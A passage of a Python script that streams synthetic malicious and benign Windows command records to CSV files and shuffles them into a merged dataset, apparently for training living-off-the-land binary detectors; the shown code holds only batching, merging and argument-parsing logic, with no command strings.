        writer = csv.DictWriter(
            f,
            fieldnames=list(CSV_FIELDNAMES),
            extrasaction="ignore",
        )
        if write_header:
            writer.writeheader()
        for row in rows:
            writer.writerow({k: row[k] for k in CSV_FIELDNAMES})


def write_csv_batched(
    path: Path,
    generator,
    n: int,
    start_id: int,
    base_time: datetime,
    registry: UniqueCommandRegistry,
    *,
    batch_size: int = WRITE_BATCH_SIZE,
    label: str = "",
    parametric_index: int = 0,
) -> int:
    """Stream rows to disk in chunks (safe for millions of rows)."""
    if n <= 0:
        raise ValueError("n must be positive")
    path.parent.mkdir(parents=True, exist_ok=True)
    t0 = time.perf_counter()
    written = 0
    for offset in range(0, n, batch_size):
        chunk_n = min(batch_size, n - offset)
        rows, parametric_index = generator(
            chunk_n,
            start_id + offset,
            base_time,
            registry,
            parametric_index=parametric_index,
        )
        _append_csv_rows(path, rows, write_header=(offset == 0))
        written += chunk_n
        if label:
            elapsed = time.perf_counter() - t0
            rate = written / elapsed if elapsed > 0 else 0.0
            print(
                f"  [{label}] {written:,}/{n:,} rows ({100.0 * written / n:.1f}%) "
                f"- {rate:,.0f} rows/s",
                flush=True,
            )
    print(
        f"  [{label}] finished {written:,} unique rows -> {path} "
        f"(registry={len(registry):,})",
        flush=True,
    )
    return parametric_index


def merge_csv_hypergeometric_shuffle(
    malicious_path: Path,
    benign_path: Path,
    merged_path: Path,
    n_each: int,
) -> None:
    """Random merge of two CSVs without loading all rows into memory."""
    merged_path.parent.mkdir(parents=True, exist_ok=True)
    remaining_mal = n_each
    remaining_ben = n_each
    t0 = time.perf_counter()
    written = 0
    total = n_each * 2

    with malicious_path.open(newline="", encoding="utf-8") as f_mal, benign_path.open(
        newline="", encoding="utf-8"
    ) as f_ben, merged_path.open("w", newline="", encoding="utf-8") as f_out:
        mal_reader = csv.DictReader(f_mal)
        ben_reader = csv.DictReader(f_ben)
        writer = csv.DictWriter(
            f_out,
            fieldnames=list(CSV_FIELDNAMES),
            extrasaction="ignore",
        )
        writer.writeheader()

        while remaining_mal > 0 or remaining_ben > 0:
            if remaining_mal == 0:
                row = next(ben_reader)
                remaining_ben -= 1
            elif remaining_ben == 0:
                row = next(mal_reader)
                remaining_mal -= 1
            elif random.random() < remaining_mal / (remaining_mal + remaining_ben):
                row = next(mal_reader)
                remaining_mal -= 1
            else:
                row = next(ben_reader)
                remaining_ben -= 1
            writer.writerow({k: row.get(k, "") for k in CSV_FIELDNAMES})
            written += 1
            if written % 100_000 == 0:
                elapsed = time.perf_counter() - t0
                rate = written / elapsed if elapsed > 0 else 0.0
                print(
                    f"  [merged] {written:,}/{total:,} ({100.0 * written / total:.1f}%) "
                    f"- {rate:,.0f} rows/s",
                    flush=True,
                )

    print(f"  [merged] finished {written:,} rows -> {merged_path}", flush=True)


def _output_paths(rows_per_class: int) -> tuple[Path, Path, Path]:
    if rows_per_class >= 1_000_000 and rows_per_class % 1_000_000 == 0:
        n_label = f"{rows_per_class // 1_000_000}M"
    else:
        n_label = str(rows_per_class)
    mal = OUTPUT_DIR / f"winlolbin_gt_unprocessed_malicious_{n_label.lower()}.csv"
    ben = OUTPUT_DIR / f"winlolbin_gt_unprocessed_benign_{n_label.lower()}.csv"
    merged_rows = rows_per_class * 2
    if merged_rows >= 1_000_000 and merged_rows % 1_000_000 == 0:
        merged_label = f"{merged_rows // 1_000_000}m"
    else:
        merged_label = str(merged_rows)
    merged = OUTPUT_DIR / f"winlolbin_gt_unprocessed_merged_{merged_label}.csv"
    return mal, ben, merged


def main() -> None:
    ap = argparse.ArgumentParser(description="Generate WinLOLBIN-GT unprocessed datasets at scale.")
    ap.add_argument(
        "--rows-per-class",
        type=int,
        default=DEFAULT_ROWS_PER_CLASS,
        help=f"Rows per label (default {DEFAULT_ROWS_PER_CLASS:,})",
    )
    ap.add_argument(
        "--batch-size",
        type=int,
        default=WRITE_BATCH_SIZE,
        help=f"Rows per write batch (default {WRITE_BATCH_SIZE:,})",
    )
    ap.add_argument(
        "--skip-merged",
        action="store_true",
        help="Only write per-class CSVs, not the shuffled merge",
    )
    args = ap.parse_args()
    n = args.rows_per_class
    if n < 1:
        raise SystemExit("--rows-per-class must be >= 1")

    random.seed(SEED)
    base_time = datetime(2026, 2, 14, 0, 0, 0, tzinfo=timezone.utc)
    malicious_path, benign_path, merged_path = _output_paths(n)

    print(
        f"Generating {n:,} unique malicious + {n:,} unique benign rows (seed={SEED})",
        flush=True,
    )
    print(f"Output directory: {OUTPUT_DIR}", flush=True)

    malicious_registry = UniqueCommandRegistry()
    benign_registry = UniqueCommandRegistry()

    write_csv_batched(
        malicious_path,
        generate_lolbin_records,
        n,
        1,
        base_time,
        malicious_registry,
        batch_size=args.batch_size,
        label="malicious",
    )
    write_csv_batched(
        benign_path,
        generate_benign_records,
        n,
        n + 1,
        base_time,
        benign_registry,
        batch_size=args.batch_size,
        label="benign",
    )
    print(
        f"Unique dedup keys: malicious={len(malicious_registry):,}, "
        f"benign={len(benign_registry):,}",
        flush=True,
    )

    if not args.skip_merged:
        print("Merging with random shuffle (streaming)...", flush=True)
        merge_csv_hypergeometric_shuffle(malicious_path, benign_path, merged_path, n)

    print("\nDone.")
    print(f"  Malicious: {malicious_path}")
    print(f"  Benign:    {benign_path}")
    if not args.skip_merged:
        print(f"  Merged:    {merged_path}")


if __name__ == "__main__":
    main()
